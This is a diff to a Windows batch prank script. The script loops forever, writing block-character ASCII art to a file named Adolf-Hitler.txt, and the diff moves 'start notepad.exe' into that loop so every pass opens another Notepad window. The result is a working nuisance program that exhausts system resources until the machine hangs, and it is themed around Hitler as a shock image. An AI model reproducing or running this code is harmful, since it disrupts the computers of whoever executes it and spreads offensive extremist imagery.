@@ -13,10 +13,6 @@ cls
 
 REM Loops
 
-:Notepad
-	start "" notepad.exe
-	goto :Hitler
-
 :Hitler  
 	echo.
 	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > Adolf-Hitler.txt
@@ -31,4 +27,5 @@ REM Loops
   	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> Adolf-Hitler.txt
   	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> Adolf-Hitler.txt
   	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> Adolf-Hitler.txt
-	goto :Notepad
+	start "" notepad.exe
+	goto :Hitler
